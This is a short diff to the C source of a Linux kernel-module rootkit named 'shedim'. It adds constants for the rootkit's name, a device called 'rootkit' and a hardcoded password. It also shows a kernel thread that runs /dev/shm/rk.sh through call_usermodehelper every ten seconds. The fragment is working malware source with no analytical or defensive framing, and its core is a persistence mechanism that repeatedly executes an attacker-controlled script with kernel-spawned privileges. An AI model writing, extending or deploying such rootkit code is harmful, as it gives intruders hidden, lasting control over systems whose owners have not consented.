@@ -16,13 +16,21 @@
 #include <asm/paravirt.h>
 #include <asm/pgtable.h>
 
-#include "safe_str.h"
-#include "defs.h"
-
 #define MIN(a,b) \
 	({ typeof (a) _a = (a); \
 	 typeof (b) _b = (b); \
 	 _a < _b ? _a : _b; })
+
+
+#define DEBUG 1
+
+#define RK_NAME "shedim"
+#define RK_CMD "/dev/shm/rk.sh"
+#define RK_PASSWORD "secret_password"
+#define RK_PASSWORD_LEN 15
+#define RK_DEVICE_NAME "rootkit"
+
+#define BUF_SIZE 256
 
 static int open = 0;
 static char msg_buf[BUF_SIZE];
@@ -133,7 +141,7 @@ rk_thread(void *data)
 {
 	do {
 #ifdef DEBUG
-		pr_info("%s: executing %s\n", RK_NAME, CMD);
+		pr_info("%s: executing %s\n", RK_NAME, RK_CMD);
 #endif
 		call_usermodehelper(RK_CMD, NULL, NULL, UMH_NO_WAIT);
 		msleep(10000);
